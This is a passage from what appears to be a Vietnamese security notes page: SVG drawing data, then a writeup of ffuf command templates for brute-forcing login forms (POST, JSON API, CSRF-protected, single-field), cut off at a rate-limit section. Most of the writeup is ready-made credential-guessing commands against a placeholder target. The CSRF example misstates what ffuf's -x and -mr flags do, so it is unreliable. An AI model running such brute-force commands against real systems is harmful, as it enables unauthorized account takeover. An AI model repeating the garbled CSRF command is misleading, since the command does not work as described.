<path d="M213.30 -689.19 L213.43 -690.33 L212.60 -689.55 L212.03 -688.70 L211.39 -687.14 L210.44 -685.01 L209.67 -682.82 L208.91 -680.41 L208.34 -678.07 L207.83 -675.73 L207.38 -673.61 L207.19 -671.76 L207.06 -670.27 L206.87 -668.79 L206.81 -667.58 L206.81 -665.95 L206.68 -664.68 L206.81 -663.33 L206.81 -661.98 L207.19 -660.85 L208.21 -660.57 L209.10 -661.06 L209.86 -661.70 L209.86 -661.70" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M224.30 -684.09 L223.48 -683.24 L222.46 -680.69 L221.57 -678.35 L220.81 -675.80 L220.04 -673.25 L219.34 -670.56 L219.09 -669.28 L218.51 -666.80 L218.13 -665.60 L217.75 -663.69 L217.50 -662.20 L217.24 -661.06 L216.99 -659.93 L216.29 -660.64 L216.16 -662.06 L216.16 -663.33 L216.48 -664.32 L217.12 -665.03 L218.26 -665.46 L219.72 -665.74 L221.00 -665.88 L224.11 -666.66 L226.02 -667.44 L226.98 -667.86 L227.93 -668.43 L230.16 -670.70 L230.73 -671.83 L230.98 -672.89 L231.18 -674.17 L230.67 -675.30 L229.27 -675.38 L227.74 -674.60 L226.02 -673.25 L223.86 -670.77 L222.84 -668.79 L222.46 -667.94 L221.95 -666.31 L221.76 -664.96 L221.82 -663.26 L222.33 -662.06 L223.22 -661.35 L224.69 -661.35 L227.55 -662.41 L228.50 -663.05 L230.22 -664.32 L231.56 -665.74 L232.70 -666.80 L233.47 -667.86 L234.17 -668.79 L234.67 -669.57 L235.25 -670.56 L235.76 -671.55 L236.20 -672.40 L236.52 -673.32 L236.39 -674.45 L235.44 -674.03 L235.50 -672.68 L235.76 -671.55 L236.14 -670.56 L236.46 -669.64 L236.77 -668.64 L237.16 -667.58 L237.47 -666.66 L238.11 -665.95 L239.25 -665.60 L241.67 -665.81 L241.67 -665.81" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M747.19 -655.18 L746.17 -654.76 L745.03 -654.33 L745.54 -653.34 L749.54 -652.91 L751.20 -652.84 L754.63 -652.77 L758.39 -652.77 L762.14 -652.84 L765.89 -652.84 L769.58 -652.91 L773.15 -653.13 L776.46 -653.34 L779.45 -653.62 L781.99 -653.90 L783.77 -654.12 L785.04 -654.40 L786.00 -654.76 L786.00 -654.76" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M786.00 -665.31 L785.49 -666.16 L786.51 -666.52 L787.65 -666.02 L788.48 -665.31 L789.05 -664.39 L789.24 -663.12 L788.99 -661.20 L788.16 -658.72 L786.76 -656.24 L785.23 -654.05 L783.71 -651.99 L783.01 -651.14 L781.74 -649.65 L780.84 -648.73 L780.84 -648.73" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M838.36 -666.80 L837.59 -666.23 L838.99 -666.37 L840.20 -666.45 L841.60 -666.52 L843.06 -666.59 L846.18 -666.52 L846.18 -666.52" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M870.29 -662.19 L870.74 -663.12 L870.74 -664.68 L870.42 -665.95 L869.98 -666.94 L869.47 -667.79 L868.70 -668.43 L867.49 -668.64 L866.48 -668.22 L865.71 -667.58 L865.01 -666.59 L864.69 -665.31 L864.95 -664.18 L865.71 -663.54 L868.00 -664.46 L869.47 -666.23 L870.74 -668.93 L871.31 -670.49 L872.39 -673.60 L873.22 -676.93 L873.79 -680.12 L874.43 -683.03 L874.75 -685.51 L874.94 -687.28 L875.13 -688.55 L875.19 -690.04 L874.49 -689.33 L873.92 -686.14 L873.54 -683.52 L873.28 -680.54 L873.22 -679.06 L873.03 -676.08 L872.97 -671.62 L872.97 -668.71 L872.77 -666.09 L872.77 -663.97 L872.77 -662.19 L872.77 -662.19" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M881.87 -667.30 L880.85 -668.08 L880.15 -668.71 L879.45 -669.49 L879.45 -669.49" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M882.19 -660.28 L883.59 -660.28 L883.59 -660.28" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M915.27 -687.21 L914.95 -688.34 L914.25 -687.35 L914.00 -683.52 L914.13 -680.69 L914.13 -677.78 L914.19 -676.51 L914.45 -673.82 L914.70 -671.62 L914.89 -669.92 L915.02 -668.57 L915.21 -667.01 L915.14 -665.81 L914.51 -666.52 L913.68 -669.56 L912.79 -673.18 L912.15 -677.43 L911.71 -681.40 L911.71 -685.08 L912.03 -689.69 L912.22 -691.03 L912.98 -693.37 L913.75 -695.00 L914.64 -696.06 L915.40 -696.77 L916.61 -696.84 L917.44 -696.21 L918.39 -694.36 L918.77 -693.30 L919.47 -689.61 L919.47 -687.99 L919.34 -686.50 L919.09 -685.22 L918.77 -684.16 L918.45 -682.74 L918.14 -681.75 L917.88 -680.48 L917.63 -679.41 L917.75 -678.14 L918.26 -677.22 L919.66 -675.38 L920.43 -674.66 L921.89 -672.82 L923.48 -671.05 L924.88 -669.42 L926.15 -667.86 L927.04 -666.59 L927.61 -665.59 L928.06 -664.75 L928.19 -663.61 L927.81 -662.69 L927.11 -661.98 L926.09 -661.63 L924.88 -661.70 L923.67 -662.19 L922.59 -662.69 L921.89 -663.33 L921.63 -664.39 L921.63 -664.39" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M931.81 -670.27 L930.67 -669.99 L929.84 -669.42 L929.20 -668.64 L928.89 -667.44 L929.20 -666.37 L929.90 -665.59 L930.80 -665.10 L931.88 -665.38 L931.81 -666.87 L931.43 -667.79 L931.43 -667.79" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M941.23 -671.12 L940.02 -671.48 L938.81 -671.19 L937.98 -670.77 L937.16 -670.20 L936.58 -669.49 L936.01 -668.64 L936.27 -667.44 L937.41 -667.79 L938.87 -668.93 L940.21 -670.77 L941.36 -673.18 L942.31 -676.01 L943.46 -680.62 L943.96 -683.52 L944.47 -686.07 L944.79 -688.06 L944.98 -689.55 L945.11 -691.03 L945.05 -692.31 L944.47 -691.39 L943.96 -687.70 L943.52 -684.87 L943.26 -682.18 L943.26 -680.90 L943.26 -678.78 L943.26 -676.93 L943.33 -675.38 L943.52 -674.24 L943.71 -672.75 L943.96 -671.76 L944.60 -671.05 L945.81 -671.48 L946.51 -672.04 L947.27 -672.75 L947.97 -673.39 L948.48 -672.40 L948.74 -671.41 L949.18 -670.27 L949.75 -669.35 L950.71 -668.93 L951.79 -669.14 L952.49 -669.92 L953.25 -671.19 L953.95 -672.97 L954.40 -674.24 L954.72 -675.23 L955.03 -676.29 L954.78 -674.88 L954.72 -673.46 L954.65 -670.63 L954.40 -667.79 L954.27 -666.52 L953.95 -663.68 L953.51 -660.99 L952.81 -657.24 L952.55 -656.17 L952.04 -654.40 L951.47 -652.91 L950.90 -651.85 L950.20 -650.93 L949.31 -650.43 L948.04 -650.01 L946.83 -650.22 L945.55 -650.79 L944.79 -651.49 L943.52 -654.05 L943.84 -655.61 L944.60 -656.31 L946.51 -657.30 L947.59 -657.80 L947.59 -657.80" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M804.83 -668.29 L805.34 -669.14 L806.17 -669.71 L807.44 -669.78 L808.39 -669.28 L809.54 -668.22 L810.43 -666.80 L811.00 -665.74 L811.51 -663.97 L811.83 -662.27 L811.64 -658.30 L811.32 -655.82 L811.06 -654.76 L810.62 -652.91 L810.17 -651.49 L809.79 -650.36 L809.41 -649.44 L808.84 -648.52 L808.39 -647.60 L807.88 -646.68 L808.14 -645.40 L808.77 -644.55 L810.17 -642.21 L811.38 -640.30 L812.53 -638.17 L814.05 -634.84 L814.56 -633.64 L815.39 -631.37 L816.22 -629.10 L816.85 -626.77 L817.55 -624.57 L817.81 -623.36 L818.13 -621.38 L818.38 -619.68 L818.51 -618.05 L818.51 -616.64 L818.38 -615.22 L818.25 -614.01 L818.06 -612.38 L818.00 -610.97 L818.00 -609.69 L818.13 -608.41 L818.57 -607.28 L819.84 -605.58 L821.12 -604.66 L822.45 -604.09 L822.45 -604.09" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M838.74 -614.65 L837.91 -614.15 L838.93 -613.73 L841.35 -613.80 L842.68 -613.94 L845.86 -614.29 L849.11 -614.86 L849.11 -614.86" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M870.80 -623.79 L870.17 -623.08 L869.98 -621.67 L869.98 -620.04 L870.17 -618.55 L870.29 -615.57 L870.42 -614.37 L870.48 -612.38 L870.48 -609.34 L870.42 -608.13 L870.29 -606.78 L870.04 -605.58 L868.89 -606.00 L868.70 -607.14 L868.58 -608.35 L868.70 -609.62 L869.15 -610.82 L870.48 -612.52 L871.69 -614.01 L872.90 -615.01 L874.05 -615.71 L875.26 -616.28 L876.40 -616.70 L877.42 -617.06 L878.69 -617.48 L879.84 -617.91 L880.85 -618.40 L881.74 -619.11 L882.57 -619.96 L883.08 -621.10 L883.34 -622.44 L883.46 -623.58 L883.65 -624.99 L883.34 -623.72 L883.34 -622.23 L883.40 -619.33 L883.46 -618.05 L883.97 -613.09 L884.23 -612.10 L884.48 -610.33 L884.93 -609.05 L884.93 -609.05" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M893.58 -611.25 L892.56 -611.53 L892.56 -611.53" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M893.58 -604.23 L892.88 -603.60 L892.88 -603.60" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M911.01 -624.21 L910.06 -626.41 L909.67 -627.26 L909.23 -626.34 L909.23 -624.93 L909.48 -622.09 L909.55 -619.18 L909.74 -616.49 L909.80 -614.37 L909.93 -612.60 L909.93 -611.25 L909.99 -609.62 L909.99 -608.35 L910.06 -609.48 L910.76 -610.19 L912.73 -611.67 L914.38 -613.09 L915.78 -614.58 L917.24 -616.28 L918.45 -617.98 L919.09 -618.90 L920.11 -620.89 L920.43 -621.80 L921.00 -623.43 L921.44 -624.93 L921.70 -625.99 L921.95 -627.26 L921.70 -628.40 L921.13 -627.40 L920.49 -624.07 L919.98 -621.59 L919.85 -619.33 L919.73 -617.34 L919.73 -615.64 L919.92 -614.15 L920.36 -611.74 L920.74 -609.83 L921.13 -608.35 L921.44 -607.00 L921.83 -606.00 L922.33 -604.87 L922.91 -604.23 L922.91 -604.23" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M925.32 -607.00 L926.34 -607.28 L927.17 -607.70 L928.12 -608.48 L928.82 -609.41 L928.95 -610.54 L928.63 -611.53 L927.87 -612.31 L926.85 -612.67 L925.71 -612.24 L925.20 -611.39 L924.88 -610.26 L924.82 -608.98 L925.07 -607.70 L925.45 -606.50 L926.09 -605.44 L926.85 -604.73 L928.19 -604.44 L928.19 -604.44" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M941.55 -610.26 L941.23 -611.25 L940.47 -611.89 L939.13 -611.96 L938.24 -611.67 L936.08 -609.76 L935.38 -609.19 L934.42 -607.99 L933.85 -606.93 L933.53 -605.94 L933.34 -604.73 L933.85 -603.67 L934.99 -603.45 L935.88 -603.81 L937.79 -605.58 L938.62 -607.00 L939.26 -608.20 L939.64 -609.26 L940.08 -610.33 L940.21 -611.53 L939.64 -610.54 L939.57 -609.26 L939.64 -608.06 L939.89 -606.85 L940.34 -605.72 L940.34 -605.72" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M957.45 -609.76 L956.50 -610.54 L955.67 -611.32 L954.72 -611.82 L953.76 -612.24 L952.49 -612.31 L951.41 -611.89 L949.50 -610.26 L948.16 -608.77 L947.59 -607.99 L946.83 -606.71 L946.32 -605.65 L946.00 -604.66 L946.06 -603.10 L946.70 -602.32 L948.16 -602.53 L951.15 -605.16 L952.68 -607.57 L952.68 -607.57" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M959.23 -628.82 L959.17 -630.03 L958.85 -630.95 L957.96 -630.38 L957.26 -627.90 L956.75 -625.35 L956.37 -622.66 L955.99 -618.69 L955.99 -616.28 L955.99 -613.73 L956.12 -610.89 L956.24 -608.20 L956.50 -606.15 L956.69 -604.38 L956.94 -603.03 L957.20 -601.82 L957.52 -600.90 L958.28 -599.91 L959.36 -599.70 L960.12 -600.19 L961.65 -602.25 L962.67 -604.23 L962.99 -605.16 L963.50 -606.78 L963.94 -608.20 L964.13 -609.34 L964.20 -610.82 L963.94 -612.10 L963.11 -612.67 L962.35 -611.96 L961.91 -611.11 L961.59 -609.83 L961.33 -608.56 L961.21 -607.21 L961.40 -605.86 L961.84 -604.66 L962.41 -603.81 L963.24 -603.24 L964.58 -603.24 L965.59 -603.81 L967.69 -605.51 L968.90 -606.93 L969.86 -608.06 L970.43 -608.91 L971.07 -609.83 L970.88 -608.77 L971.83 -607.00 L972.91 -605.08 L974.31 -603.24 L975.58 -601.40 L976.92 -599.77 L978.32 -598.28 L979.27 -597.29 L980.10 -596.44 L980.86 -595.80 L981.82 -595.24 L983.09 -595.37 L983.09 -595.37" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M838.36 -572.35 L837.47 -571.92 L838.23 -571.29 L839.50 -571.14 L840.84 -571.07 L844.91 -571.14 L847.77 -571.29 L847.77 -571.29" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M862.79 -575.32 L863.74 -574.97 L863.68 -573.62 L863.74 -572.13 L863.80 -570.86 L864.06 -569.59 L864.31 -568.24 L864.69 -566.96 L865.20 -565.90 L865.84 -565.05 L866.79 -564.62 L868.19 -564.84 L870.93 -566.32 L872.65 -567.81 L873.98 -569.59 L875.26 -571.35 L876.15 -572.91 L876.66 -574.12 L877.10 -575.04 L877.48 -576.10 L876.97 -575.18 L876.91 -573.76 L876.85 -572.35 L876.97 -569.30 L877.23 -567.10 L877.61 -565.47 L878.12 -564.13 L878.63 -563.21 L879.65 -562.43 L879.65 -562.43" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M896.00 -567.46 L894.79 -567.53 L894.79 -567.53" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M895.17 -559.88 L894.53 -559.10 L895.30 -558.25 L895.30 -558.25" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M946.19 -567.53 L945.55 -568.38 L944.60 -568.73 L944.09 -567.60 L943.77 -566.54 L943.58 -565.26 L943.52 -563.91 L943.58 -562.64 L943.84 -561.65 L944.47 -560.87 L945.55 -560.52 L946.51 -560.87 L947.72 -561.72 L949.05 -563.06 L950.07 -564.41 L950.77 -565.47 L951.28 -566.40 L951.79 -567.46 L952.04 -568.59 L951.28 -567.95 L950.90 -566.96 L950.26 -564.69 L949.94 -562.92 L949.75 -561.29 L949.75 -559.95 L949.94 -558.74 L950.07 -557.61 L950.52 -556.40 L951.28 -555.62 L952.55 -555.41 L954.46 -556.33 L956.50 -558.81 L957.01 -559.59 L957.71 -561.01 L958.22 -562.22 L958.53 -563.63 L958.66 -564.91 L958.15 -565.83 L957.13 -565.47 L957.13 -564.06 L957.39 -562.85 L957.64 -561.72 L957.96 -560.59 L959.11 -557.89 L959.68 -556.26 L960.25 -554.92 L960.70 -553.71 L961.14 -552.72 L961.71 -551.66 L962.22 -550.81 L963.11 -550.17 L964.39 -550.45 L965.72 -551.66 L965.72 -551.66" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M972.28 -573.55 L971.07 -573.27 L970.56 -571.78 L969.60 -569.66 L968.84 -567.03 L968.14 -564.20 L967.82 -562.78 L967.31 -559.88 L967.06 -557.18 L967.06 -555.06 L967.12 -553.29 L967.38 -551.87 L967.69 -550.59 L968.14 -549.74 L968.84 -549.11 L969.86 -548.54 L970.94 -548.75 L970.94 -548.75" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M994.16 -566.75 L993.71 -567.81 L992.57 -567.53 L992.19 -566.32 L991.49 -561.93 L991.30 -560.73 L991.17 -557.96 L991.04 -556.76 L990.98 -554.71 L990.92 -553.08 L990.79 -551.73 L990.72 -550.17 L990.66 -548.89 L989.96 -549.60 L990.22 -550.59 L990.72 -551.58 L991.81 -552.58 L992.57 -553.36 L994.22 -554.71 L995.88 -555.98 L996.64 -556.55 L997.79 -557.47 L999.44 -558.67 L1000.27 -559.24 L998.42 -556.76 L997.02 -554.92 L995.24 -551.87 L994.73 -550.95 L993.97 -549.39 L993.52 -548.04 L993.27 -546.63 L993.65 -545.64 L994.67 -545.14 L995.75 -545.49 L997.47 -546.91 L998.74 -548.75 L999.89 -550.52 L1000.27 -551.37 L1000.90 -552.72 L1001.41 -553.78 L1001.86 -554.92 L1002.18 -555.84 L1001.92 -554.71 L1001.92 -553.43 L1002.18 -552.22 L1002.88 -551.58 L1003.89 -551.87 L1004.66 -552.65 L1006.31 -555.06 L1007.07 -556.55 L1007.58 -557.61 L1007.97 -558.46 L1008.35 -559.45 L1007.39 -559.74 L1006.88 -558.89 L1006.88 -557.54 L1007.33 -556.19 L1007.84 -555.13 L1008.35 -554.14 L1008.92 -553.08 L1009.56 -552.22 L1010.06 -551.37 L1010.57 -550.59 L1011.15 -549.67 L1011.85 -548.75 L1012.61 -547.97 L1013.44 -547.33 L1013.44 -547.33" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M1024.32 -553.29 L1024.25 -554.71 L1023.74 -555.55 L1022.60 -555.98 L1021.39 -555.62 L1020.50 -555.06 L1019.61 -553.93 L1019.10 -553.15 L1018.34 -551.87 L1017.89 -550.74 L1017.76 -549.32 L1018.14 -548.26 L1019.16 -547.90 L1020.12 -548.47 L1020.82 -549.25 L1021.33 -550.38 L1021.64 -551.58 L1022.03 -552.65 L1022.34 -553.64 L1022.85 -551.16 L1022.98 -549.96 L1023.11 -547.20 L1023.23 -545.85 L1023.30 -543.44 L1023.30 -541.38 L1023.23 -539.68 L1023.11 -538.19 L1023.04 -536.99 L1022.73 -535.57 L1022.22 -534.58 L1021.13 -534.09 L1020.05 -534.72 L1019.35 -535.64 L1018.91 -536.71 L1018.91 -538.13 L1019.48 -539.04 L1020.50 -540.11 L1021.07 -540.82 L1023.11 -542.59 L1024.38 -543.58 L1025.59 -544.57 L1026.54 -545.42 L1028.51 -547.05 L1029.47 -548.11 L1030.23 -549.18 L1030.74 -550.10 L1031.19 -550.95 L1031.50 -552.08 L1031.57 -553.29 L1031.25 -554.21 L1030.17 -553.93 L1029.60 -553.08 L1029.34 -552.08 L1029.21 -550.81 L1029.34 -549.60 L1030.23 -547.76 L1030.74 -547.05 L1031.82 -545.99 L1032.90 -545.49 L1034.05 -545.21 L1035.26 -545.42 L1038.12 -546.42 L1040.28 -547.76 L1042.26 -549.32 L1044.10 -550.88 L1044.86 -551.66 L1045.95 -552.86 L1046.84 -553.78 L1047.41 -554.56 L1047.92 -555.34 L1047.09 -554.63 L1046.71 -553.50 L1046.33 -550.10 L1046.14 -548.33 L1046.07 -546.70 L1046.07 -545.35 L1045.88 -543.79 L1045.76 -542.52 L1044.93 -543.08 L1044.93 -543.08" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M1043.46 -547.33 L1042.96 -548.89 L1042.51 -550.03 L1042.13 -551.16 L1041.68 -552.08 L1042.64 -552.44 L1044.16 -552.44 L1045.69 -552.44 L1050.08 -551.87 L1052.82 -551.73 L1052.82 -551.73" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M815.90 -607.99 L816.28 -606.85 L816.54 -605.65 L816.79 -604.31 L817.04 -602.82 L817.23 -600.76 L817.23 -598.07 L817.11 -596.65 L816.85 -593.68 L816.47 -590.77 L816.03 -587.94 L815.26 -583.76 L814.88 -581.20 L814.75 -580.07 L814.50 -578.16 L814.37 -576.46 L814.50 -574.97 L814.75 -573.62 L815.39 -571.57 L816.73 -569.66 L818.51 -568.17 L820.86 -566.75 L823.98 -565.90 L825.70 -565.55 L825.70 -565.55" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M52.76 -772.32 L53.38 -773.01 L53.01 -773.92 L52.44 -774.69 L51.56 -775.11 L50.43 -774.90 L49.68 -774.20 L49.12 -773.43 L48.74 -772.52 L48.49 -771.48 L48.30 -770.36 L48.30 -768.75 L48.49 -767.35 L48.61 -766.30 L48.80 -765.12 L49.05 -763.93 L49.24 -762.67 L49.49 -761.27 L49.68 -759.95 L49.81 -758.62 L49.99 -757.36 L49.99 -755.82 L50.06 -754.43 L49.99 -753.10 L49.81 -752.05 L49.37 -751.07 L48.80 -750.37 L48.05 -749.60 L47.30 -748.97 L46.54 -748.48 L45.79 -747.99 L46.61 -748.41 L47.36 -747.72 L48.05 -747.09 L48.55 -746.32 L48.99 -745.48 L49.37 -744.64 L49.56 -743.52 L49.68 -742.33 L49.56 -741.01 L49.49 -739.82 L49.30 -738.63 L49.05 -737.44 L48.80 -736.46 L48.55 -735.28 L48.24 -734.09 L47.99 -732.97 L47.74 -731.78 L47.49 -730.81 L47.30 -729.62 L47.23 -728.36 L47.11 -726.96 L47.11 -725.49 L47.23 -724.10 L47.49 -723.04 L47.61 -721.86 L47.99 -720.81 L48.36 -719.90 L48.99 -719.13 L49.74 -718.37 L50.43 -717.66 L51.19 -716.90 L51.94 -716.27 L52.63 -715.71 L53.38 -715.22 L54.26 -714.66 L55.33 -714.45 L56.21 -714.94 L56.21 -714.94" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M27.78 -743.66 L26.72 -744.01 L25.59 -744.29 L24.08 -744.36 L20.38 -744.08 L18.81 -743.87 L15.67 -743.17 L12.10 -742.19 L8.33 -740.80 L4.50 -739.12 L0.80 -737.16 L-2.71 -735.00 L-6.10 -732.76 L-9.24 -730.32 L-10.74 -729.13 L-13.50 -726.68 L-17.14 -722.77 L-19.34 -720.25 L-21.22 -717.73 L-22.79 -715.29 L-24.23 -712.84 L-25.49 -710.33 L-26.68 -707.74 L-27.18 -706.63 L-28.19 -704.32 L-29.06 -702.15 L-29.44 -701.10 L-30.70 -698.10 L-31.13 -696.98 L-31.57 -695.72 L-31.89 -694.81 L-32.33 -693.77 L-32.64 -692.86 L-32.64 -692.86" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M-33.90 -715.43 L-34.52 -714.59 L-35.28 -712.98 L-36.09 -710.75 L-36.91 -708.02 L-37.47 -705.15 L-37.79 -702.22 L-38.04 -699.35 L-38.04 -696.00 L-37.97 -694.26 L-37.72 -692.86 L-37.41 -691.67 L-36.97 -690.69 L-35.97 -689.50 L-34.71 -688.39 L-33.27 -687.90 L-30.38 -687.90 L-29.06 -688.10 L-26.18 -689.08 L-22.79 -690.69 L-17.71 -694.12 L-16.08 -695.79 L-16.08 -695.79" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<text x="-85.62" y="-666.90" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="20" fill="#1e1e1e" text-anchor="start"><tspan x="-85.62" dy="0">--request</tspan></text>
</g>
</svg>
    </div>
  </div>
</div>


---

## 📖 Nội dung chi tiết bài viết (Writeup)

<div id="doc-2c4637f01ee05012e84a079b3aedc1ac98ee7584" class="notion-callout-card">

Dưới đây là một số template dùng **ffuf** để brute force cổng đăng nhập (login form) mà bạn có thể tham khảo. Tùy vào cấu trúc form và phản hồi của server, bạn điều chỉnh các tham số cho phù hợp.

---

## 1. Template cơ bản – Brute force username & password (POST form)

Giả sử form login có 2 trường `username` và `password`, server trả về mã 401 khi sai thông tin.

```bash
ffuf -w /path/to/usernames.txt:USER -w /path/to/passwords.txt:PASS \
     -X POST \
     -d "username=USER&password=PASS" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://target.com/login \
     -fc 401
```

**Giải thích:**
- `-w` : đường dẫn tới wordlist, gán alias `USER` và `PASS`.
- `-X POST` : sử dụng method POST.
- `-d` : dữ liệu gửi đi, `USER` và `PASS` sẽ được thay bằng giá trị từ wordlist.
- `-H` : header xác định kiểu dữ liệu form.
- `-u` : URL endpoint login.
- `-fc 401` : lọc bỏ các response có status code 401 (sai thông tin), chỉ hiển thị các response khác (có thể là thành công).

---

## 2. Lọc theo kích thước response (thay vì status code)

Nhiều ứng dụng trả về cùng status code (vd 200) cho cả đúng/sai, nhưng nội dung khác nhau. Bạn có thể lọc theo `-fs` (filter size) hoặc `-fw` (filter words).

```bash
ffuf -w users.txt:USER -w passes.txt:PASS \
     -X POST \
     -d "user=USER&pass=PASS" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://target.com/login \
     -fs 1234
```

- `-fs 1234` : bỏ qua các response có kích thước 1234 bytes (kích thước của trang báo lỗi).
- Bạn có thể dùng `-fw` để lọc theo số từ, hoặc `-fl` theo số dòng.

---

## 3. Login form có thêm CSRF token

Nếu form có CSRF token, bạn cần lấy token từ GET request trước, sau đó dùng `ffuf` với chế độ `-mode clusterbomb` và sử dụng `-x` (extensions) hoặc dùng `ffuf` kết hợp với script tạo token. Tuy nhiên đơn giản nhất là dùng `ffuf` với chức năng **recursion** và **dynamic values** (từ phiên bản mới). Ví dụ nâng cao:

```bash
ffuf -w users.txt:USER -w passes.txt:PASS \
     -u http://target.com/login \
     -X POST \
     -d "username=USER&password=PASS&csrf=CSRF" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -mode clusterbomb \
     -x http://target.com/get_token \
     -mr "token=(.*?)" \
     -replay-proxy http://127.0.0.1:8080
```

Cách này phức tạp, thường phải dùng script riêng hoặc `Burp Intruder`. Với ffuf, bạn có thể tạo token tĩnh nếu token không thay đổi giữa các request (ít gặp).

---

## 4. Login API trả về JSON

Nếu ứng dụng gửi/nhận JSON, bạn chỉnh `-H` và `-d` tương ứng:

```bash
ffuf -w users.txt:USER -w passes.txt:PASS \
     -X POST \
     -d '{"username":"USER","password":"PASS"}' \
     -H "Content-Type: application/json" \
     -u http://target.com/api/login \
     -fc 401
```

- Lưu ý: dùng dấu nháy đơn `'` bao quanh data nếu trong đó có dấu nháy kép `"`.

---

## 5. Brute force chỉ username (password cố định) hoặc ngược lại

Nếu bạn đã biết một trong hai, chỉ cần một wordlist và thay trực tiếp giá trị còn lại:

```bash
# Chỉ brute username, password cố định là "admin123"
ffuf -w users.txt:USER \
     -X POST \
     -d "username=USER&password=admin123" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://target.com/login \
     -fc 401

# Chỉ brute password, username cố định là "admin"
ffuf -w passes.txt:PASS \
     -X POST \
     -d "username=admin&password=PASS" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://target.com/login \
     -fc 401
```

---

## 6. Thêm delay để tránh bị chặn (rate limit)

Dùng `-p` để thêm delay giữa các request (tính bằng giây):

```bash
